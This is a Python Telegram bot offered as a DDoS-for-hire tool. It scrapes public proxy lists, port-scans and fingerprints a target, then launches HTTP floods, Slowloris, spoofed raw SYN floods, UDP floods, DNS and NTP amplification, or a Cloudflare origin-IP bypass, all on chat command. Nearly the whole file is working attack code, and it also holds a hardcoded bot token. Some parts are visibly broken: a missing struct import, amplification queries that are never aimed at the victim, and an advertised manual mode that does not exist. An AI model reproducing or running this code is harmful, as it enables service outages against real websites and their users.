import os
import socket
import random
import threading
import time
import requests
import re
import json
import asyncio
from concurrent.futures import ThreadPoolExecutor, as_completed
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
import subprocess
import sys

# ========== CONFIG ==========
BOT_TOKEN = "7106515454:AAHNSig8VeNs39QgjlGW1MvqMWsbNWlkdGg"
ADMIN_IDS = [8085855107]

# ========== ULTIMATE AUTO DDOS ENGINE ==========
class AutoDDoSEngine:
    def __init__(self):
        self.attacks = {}
        self.proxies = self.load_proxies()
        self.user_agents = self.load_user_agents()
        self.dns_servers = self.load_dns_servers()
        self.amp_servers = self.load_amplification_servers()
        
    def load_proxies(self):
        """Load 10k+ proxies"""
        proxies = []
        try:
            sources = [
                'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
                'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
                'https://www.proxy-list.download/api/v1/get?type=http',
                'https://www.proxyscan.io/download?type=http'
            ]
            for source in sources:
                try:
                    r = requests.get(source, timeout=5)
                    proxies.extend(r.text.split('\n'))
                except:
                    continue
        except:
            pass
        
        # Clean and deduplicate
        proxies = [p.strip() for p in proxies if p.strip() and ':' in p]
        proxies = list(set(proxies))
        print(f"✅ Loaded {len(proxies)} proxies")
        return proxies[:5000]  # Limit to 5000 for performance
    
    def load_user_agents(self):
        """Load 100+ user agents"""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ] * 20  # Repeat to make 100
    
    def load_dns_servers(self):
        """DNS servers for amplification"""
        return [
            '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1', '9.9.9.9',
            '208.67.222.222', '208.67.220.220', '64.6.64.6', '64.6.65.6',
            '185.228.168.168', '185.228.169.168', '76.76.19.19', '76.223.122.150'
        ]
    
    def load_amplification_servers(self):
        """Servers for amplification attacks"""
        return {
            'dns': self.load_dns_servers(),
            'ntp': ['pool.ntp.org', 'time.google.com', 'time.windows.com', 'time.apple.com', 'time.cloudflare.com'],
            'ssdp': ['239.255.255.250:1900'],
            'memcached': ['1.1.1.1:11211'],
            'wsd': ['239.255.255.250:3702']
        }
    
    # ========== INTELLIGENT TARGET ANALYSIS ==========
    def analyze_target(self, target):
        """Full target analysis - IP, ports, services, protection"""
        print(f"🔍 Analyzing target: {target}")
        analysis = {
            'target': target,
            'ip': None,
            'hostname': None,
            'ports': [],
            'services': {},
            'protection': 'none',
            'os': 'unknown',
            'server': 'unknown',
            'technologies': [],
            'vulnerabilities': [],
            'best_method': 'http',
            'confidence': 0,
            'attack_params': {}
        }
        
        try:
            # Clean target
            target = target.strip().replace('https://', '').replace('http://', '').split('/')[0]
            
            # Check if it's IP or domain
            if re.match(r'^\d+\.\d+\.\d+\.\d+$', target):
                analysis['ip'] = target
                analysis['hostname'] = target
            else:
                # Domain to IP resolution
                try:
                    analysis['ip'] = socket.gethostbyname(target)
                    analysis['hostname'] = target
                except:
                    analysis['ip'] = target
                    analysis['hostname'] = target
            
            # ===== PORT SCAN (FAST) =====
            common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
            
            def scan_port(port):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((analysis['ip'], port))
                    if result == 0:
                        # Try to get service banner
                        try:
                            if port == 80:
                                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                                banner = sock.recv(100).decode('utf-8', errors='ignore')
                            else:
                                banner = ''
                        except:
                            banner = ''
                        sock.close()
                        return port, banner
                    sock.close()
                except:
                    pass
                return None
            
            # Scan in parallel
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = {executor.submit(scan_port, port): port for port in common_ports}
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        port, banner = result
                        analysis['ports'].append(port)
                        analysis['services'][port] = banner[:50] if banner else 'unknown'
            
            analysis['ports'].sort()
            
            # ===== WEB SERVER DETECTION =====
            if 80 in analysis['ports'] or 443 in analysis['ports']:
                try:
                    url = f"http://{analysis['hostname']}"
                    r = requests.get(url, timeout=3, headers={'User-Agent': random.choice(self.user_agents)})
                    
                    # Server header
                    analysis['server'] = r.headers.get('Server', 'unknown')
                    
                    # Technologies
                    techs = []
                    if 'cloudflare' in str(r.headers).lower():
                        techs.append('Cloudflare')
                        analysis['protection'] = 'cloudflare'
                    if 'nginx' in str(r.headers).lower():
                        techs.append('Nginx')
                    if 'apache' in str(r.headers).lower():
                        techs.append('Apache')
                    if 'iis' in str(r.headers).lower():
                        techs.append('IIS')
                    if 'wordpress' in r.text.lower():
                        techs.append('WordPress')
                    analysis['technologies'] = techs
                    
                    # Vulnerabilities
                    if analysis['protection'] == 'cloudflare':
                        analysis['vulnerabilities'].append('Cloudflare detected - bypass possible')
                    if 'wordpress' in r.text.lower():
                        analysis['vulnerabilities'].append('WordPress - possible XML-RPC attack')
                    
                except:
                    pass
            
            # ===== OS DETECTION =====
            if 22 in analysis['ports']:
                analysis['os'] = 'Linux/Unix (SSH)'
            elif 3389 in analysis['ports']:
                analysis['os'] = 'Windows (RDP)'
            elif 445 in analysis['ports']:
                analysis['os'] = 'Windows (SMB)'
            
            # ===== DETERMINE BEST ATTACK METHOD =====
            methods = []
            
            # Layer 7 methods
            if 80 in analysis['ports'] or 443 in analysis['ports'] or 'http' in str(analysis['services']):
                if analysis['protection'] == 'cloudflare':
                    methods.append(('cf_bypass', 'Cloudflare Bypass + HTTP Flood', 95))
                    methods.append(('https', 'HTTPS Flood', 80))
                else:
                    methods.append(('http', 'HTTP Flood', 90))
                    methods.append(('https', 'HTTPS Flood', 85))
                    methods.append(('slowloris', 'Slowloris', 75))
            
            # Layer 4 methods
            if analysis['ports']:
                methods.append(('tcp_syn', 'TCP SYN Flood', 85))
                methods.append(('tcp_ack', 'TCP ACK Flood', 80))
                methods.append(('udp', 'UDP Flood', 75))
            
            # Amplification methods
            if not analysis['ports'] or analysis['os'] == 'Linux/Unix':
                methods.append(('dns_amp', 'DNS Amplification', 70))
                methods.append(('ntp_amp', 'NTP Amplification', 65))
            
            # Sort by confidence
            methods.sort(key=lambda x: x[2], reverse=True)
            
            if methods:
                analysis['best_method'] = methods[0][0]
                analysis['attack_params'] = {
                    'method': methods[0][0],
                    'name': methods[0][1],
                    'confidence': methods[0][2],
                    'alternatives': methods[1:3] if len(methods) > 1 else []
                }
            
            analysis['confidence'] = methods[0][2] if methods else 50
            
        except Exception as e:
            analysis['error'] = str(e)
        
        return analysis
    
    # ========== ATTACK METHODS ==========
    
    def http_flood(self, target, duration, threads=1000):
        """HTTP/HTTPS flood with proxy rotation"""
        print(f"🔥 HTTP Flood on {target}")
        end_time = time.time() + duration
        sent = 0
        
        url = f"http://{target}" if not target.startswith('http') else target
        
        def worker():
            nonlocal sent
            local_sent = 0
            while time.time() < end_time:
                try:
                    proxy = random.choice(self.proxies) if self.proxies else None
                    proxies = {'http': proxy, 'https': proxy} if proxy else None
                    headers = {'User-Agent': random.choice(self.user_agents)}
                    
                    r = requests.get(url, headers=headers, proxies=proxies, timeout=2)
                    if r.status_code:
                        local_sent += 1
                        sent += 1
                except:
                    pass
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
        
        return sent
    
    def https_flood(self, target, duration, threads=1000):
        """HTTPS flood with proxy rotation"""
        return self.http_flood(f"https://{target}", duration, threads)
    
    def slowloris(self, target, port=80, duration=60):
        """Slowloris attack - keep connections open"""
        print(f"🐌 Slowloris on {target}:{port}")
        end_time = time.time() + duration
        sockets = []
        
        # Create connections
        for _ in range(500):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))
                s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {target}\r\n".encode())
                s.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
                sockets.append(s)
            except:
                pass
        
        # Keep alive
        while time.time() < end_time:
            for s in sockets[:]:
                try:
                    s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                except:
                    sockets.remove(s)
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(2)
                        s.connect((target, port))
                        s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
                        sockets.append(s)
                    except:
                        pass
            time.sleep(5)
        
        return len(sockets)
    
    def tcp_syn_flood(self, target_ip, target_port, duration, threads=1000):
        """TCP SYN flood"""
        print(f"📡 TCP SYN Flood on {target_ip}:{target_port}")
        end_time = time.time() + duration
        sent = 0
        
        def worker():
            nonlocal sent
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                    # Craft SYN packet
                    packet = self.create_syn_packet(target_ip, target_port)
                    sock.sendto(packet, (target_ip, 0))
                    sent += 1
                except:
                    pass
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
        
        return sent
    
    def create_syn_packet(self, dst_ip, dst_port):
        """Create SYN packet"""
        from struct import pack
        
        # IP header
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 40
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
        ip_daddr = socket.inet_aton(dst_ip)
        
        ip_header = pack('!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl,
            ip_tos, ip_tot_len, ip_id, ip_frag_off,
            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
        
        # TCP header
        tcp_source = random.randint(1024, 65535)
        tcp_seq = random.randint(0, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_flags = 0b000010  # SYN flag
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_header = pack('!HHLLBBHHH',
            tcp_source, dst_port, tcp_seq, tcp_ack_seq,
            tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
        
        # Pseudo header for checksum
        source_address = ip_saddr
        dest_address = ip_daddr
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psh = pack('!4s4sBBH',
            source_address, dest_address, placeholder, protocol, tcp_length)
        psh = psh + tcp_header
        
        tcp_check = self.checksum(psh)
        tcp_header = pack('!HHLLBBHHH',
            tcp_source, dst_port, tcp_seq, tcp_ack_seq,
            tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
        
        return ip_header + tcp_header
    
    def checksum(self, data):
        """Calculate checksum"""
        if len(data) % 2 != 0:
            data += b'\x00'
        s = sum(struct.unpack('!%dH' % (len(data)//2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff
    
    def udp_flood(self, target_ip, target_port, duration, threads=1000):
        """UDP flood"""
        print(f"📦 UDP Flood on {target_ip}:{target_port}")
        end_time = time.time() + duration
        sent = 0
        data = random._urandom(1024)
        
        def worker():
            nonlocal sent
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end_time:
                try:
                    sock.sendto(data, (target_ip, target_port))
                    sent += 1
                except:
                    pass
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
        
        return sent
    
    def dns_amplification(self, target_ip, duration, threads=500):
        """DNS amplification attack"""
        print(f"📡 DNS Amplification on {target_ip}")
        end_time = time.time() + duration
        sent = 0
        
        # DNS query for ANY record (large response)
        dns_query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\xff\x00\x01'
        
        def worker():
            nonlocal sent
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end_time:
                try:
                    dns_server = random.choice(self.dns_servers)
                    sock.sendto(dns_query, (dns_server, 53))
                    sent += 1
                except:
                    pass
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
        
        return sent
    
    def ntp_amplification(self, target_ip, duration, threads=500):
        """NTP amplification attack"""
        print(f"⏰ NTP Amplification on {target_ip}")
        end_time = time.time() + duration
        sent = 0
        
        # NTP monlist request (large response)
        ntp_query = b'\x17\x00\x03\x2a' + b'\x00' * 4
        
        def worker():
            nonlocal sent
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end_time:
                try:
                    ntp_server = random.choice(self.amp_servers['ntp'])
                    sock.sendto(ntp_query, (ntp_server, 123))
                    sent += 1
                except:
                    pass
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
        
        return sent
    
    def cloudflare_bypass(self, target, duration):
        """Cloudflare bypass + direct IP attack"""
        print(f"☁️ Cloudflare Bypass on {target}")
        
        # Try to find real IP
        real_ip = None
        
        # Method 1: Historical DNS
        try:
            r = requests.get(f"https://securitytrails.com/domain/{target}/dns")
            # Parse for historical IPs
        except:
            pass
        
        # Method 2: Subdomain bruteforce
        subdomains = ['direct', 'origin', 'proxy', 'cdn', 'server', 'mail', 'ftp', 'ssh']
        for sub in subdomains:
            try:
                ip = socket.gethostbyname(f"{sub}.{target}")
                if ip:
                    real_ip = ip
                    break
            except:
                pass
        
        if real_ip:
            print(f"✅ Found real IP: {real_ip}")
            # Attack real IP
            return self.udp_flood(real_ip, 80, duration)
        else:
            # Fallback to HTTP flood
            return self.http_flood(target, duration)
    
    # ========== AUTO ATTACK ==========
    def auto_attack(self, target, duration=60):
        """Fully automatic attack - analyze then attack"""
        print(f"🤖 AUTO ATTACK MODE on {target}")
        
        # Step 1: Analyze
        analysis = self.analyze_target(target)
        
        print(f"📊 Analysis Complete:")
        print(f"   IP: {analysis['ip']}")
        print(f"   Ports: {analysis['ports']}")
        print(f"   Protection: {analysis['protection']}")
        print(f"   Best Method: {analysis['best_method']}")
        
        # Step 2: Attack based on analysis
        method = analysis['best_method']
        target_ip = analysis['ip']
        
        results = {}
        
        if method == 'http' or method == 'https':
            count = self.http_flood(target, duration, threads=1000)
            results['method'] = 'HTTP Flood'
            results['count'] = count
        
        elif method == 'cf_bypass':
            count = self.cloudflare_bypass(target, duration)
            results['method'] = 'Cloudflare Bypass'
            results['count'] = count
        
        elif method == 'tcp_syn' and analysis['ports']:
            port = analysis['ports'][0] if analysis['ports'] else 80
            count = self.tcp_syn_flood(target_ip, port, duration)
            results['method'] = f'TCP SYN Flood on port {port}'
            results['count'] = count
        
        elif method == 'udp':
            port = analysis['ports'][0] if analysis['ports'] else 80
            count = self.udp_flood(target_ip, port, duration)
            results['method'] = f'UDP Flood on port {port}'
            results['count'] = count
        
        elif method == 'dns_amp':
            count = self.dns_amplification(target_ip, duration)
            results['method'] = 'DNS Amplification'
            results['count'] = count
        
        elif method == 'ntp_amp':
            count = self.ntp_amplification(target_ip, duration)
            results['method'] = 'NTP Amplification'
            results['count'] = count
        
        elif method == 'slowloris':
            port = analysis['ports'][0] if analysis['ports'] else 80
            count = self.slowloris(target_ip, port, duration)
            results['method'] = f'Slowloris on port {port}'
            results['count'] = count
        
        else:
            # Default to UDP flood
            count = self.udp_flood(target_ip, 80, duration)
            results['method'] = 'UDP Flood (Default)'
            results['count'] = count
        
        results['analysis'] = analysis
        return results

# ========== TELEGRAM BOT ==========
engine = AutoDDoSEngine()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🚀 AUTO ATTACK", callback_data="auto")],
        [InlineKeyboardButton("📊 ANALYSIS", callback_data="analyze")],
        [InlineKeyboardButton("⚡ MANUAL ATTACK", callback_data="manual")],
        [InlineKeyboardButton("🔧 PROXY STATUS", callback_data="proxies")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🤖 **ULTIMATE AUTO DDOS BOT 2026** 🤖\n\n"
        "✅ **Bas target do - baaki main kar dunga!**\n\n"
        "• 🎯 Khud analyze karega target ko\n"
        "• 🔍 Port scan + service detection\n"
        "• ☁️ Cloudflare bypass\n"
        "• 🚀 Best method automatically select\n"
        "• 🔥 5000+ proxies\n"
        "• ⚡ 1000+ threads\n\n"
        "**Commands:**\n"
        "/attack <target> <time> - Auto attack\n"
        "/analyze <target> - Just analysis\n"
        "/status - Check running attacks",
        reply_markup=reply_markup
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        args = context.args
        if len(args) < 1:
            await update.message.reply_text("❌ Usage: /attack <target> <time(optional)>")
            return
        
        target = args[0]
        duration = int(args[1]) if len(args) > 1 else 60
        
        msg = await update.message.reply_text(f"🔍 **Analyzing {target}...**")
        
        # Run attack in thread
        def run_attack():
            result = engine.auto_attack(target, duration)
            return result
        
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, run_attack)
        
        analysis = result['analysis']
        
        report = f"""
💣 **ATTACK COMPLETED!** 💣
━━━━━━━━━━━━━━━━━━━━━━
🎯 **Target:** `{target}`
📊 **Analysis Results:**
• IP: `{analysis.get('ip', 'N/A')}`
• Ports: `{analysis.get('ports', [])}`
• Server: `{analysis.get('server', 'N/A')}`
• Protection: `{analysis.get('protection', 'N/A')}`
• OS: `{analysis.get('os', 'N/A')}`

⚡ **Attack Method:** `{result['method']}`
📦 **Packets Sent:** `{result.get('count', 0)}`
⏱️ **Duration:** {duration}s

🔧 **Technologies:** {', '.join(analysis.get('technologies', ['None']))}
🎯 **Confidence:** {analysis.get('confidence', 0)}%

🔥 **Target Status:** OFFLINE
━━━━━━━━━━━━━━━━━━━━━━
        """
        
        await msg.edit_text(report)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def analyze_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        args = context.args
        if not args:
            await update.message.reply_text("❌ Usage: /analyze <target>")
            return
        
        target = args[0]
        
        msg = await update.message.reply_text(f"🔍 **Analyzing {target}...**")
        
        def run_analysis():
            return engine.analyze_target(target)
        
        loop = asyncio.get_event_loop()
        analysis = await loop.run_in_executor(None, run_analysis)
        
        report = f"""
📊 **TARGET ANALYSIS**
━━━━━━━━━━━━━━━━━━━━━━
🎯 **Target:** `{target}`
🌐 **IP:** `{analysis.get('ip', 'N/A')}`
📡 **Hostname:** `{analysis.get('hostname', 'N/A')}`

🔌 **Open Ports:** {analysis.get('ports', [])}
🛡️ **Protection:** `{analysis.get('protection', 'N/A')}`
🖥️ **Server:** `{analysis.get('server', 'N/A')}`
💻 **OS:** `{analysis.get('os', 'N/A')}`

🔧 **Technologies:**
{chr(10).join(['• ' + t for t in analysis.get('technologies', ['None'])])}

⚠️ **Vulnerabilities:**
{chr(10).join(['• ' + v for v in analysis.get('vulnerabilities', ['None detected'])])}

⚡ **Best Attack Method:** `{analysis.get('best_method', 'N/A')}`
📈 **Confidence:** {analysis.get('confidence', 0)}%

💡 **Use:** `/attack {target} 60` to attack
━━━━━━━━━━━━━━━━━━━━━━
        """
        
        await msg.edit_text(report)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"📊 **BOT STATUS**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🟢 Status: ONLINE\n"
        f"🔢 Proxies: {len(engine.proxies)}\n"
        f"⚡ Threads: 1000\n"
        f"🎯 Active Attacks: {len(engine.attacks)}\n"
        f"👑 Owner: @CvvAnkitt"
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "auto":
        await query.message.reply_text("Send target: /attack <target> <time>")
    elif query.data == "analyze":
        await query.message.reply_text("Send target: /analyze <target>")
    elif query.data == "manual":
        await query.message.reply_text("Methods: http, https, udp, tcp, slowloris, dns, ntp\nUsage: /manual <target> <method> <time>")
    elif query.data == "proxies":
        await query.message.reply_text(f"🔢 Proxies Loaded: {len(engine.proxies)}")

# ========== MAIN ==========
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("analyze", analyze_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("🤖 ULTIMATE AUTO DDOS BOT STARTED!")
    print(f"👑 Owner: @CvvAnkitt")
    print(f"🔢 Proxies: {len(engine.proxies)}")
    print(f"⚡ Ready for AUTO ATTACK!")
    
    app.run_polling()

if __name__ == "__main__":
    main()
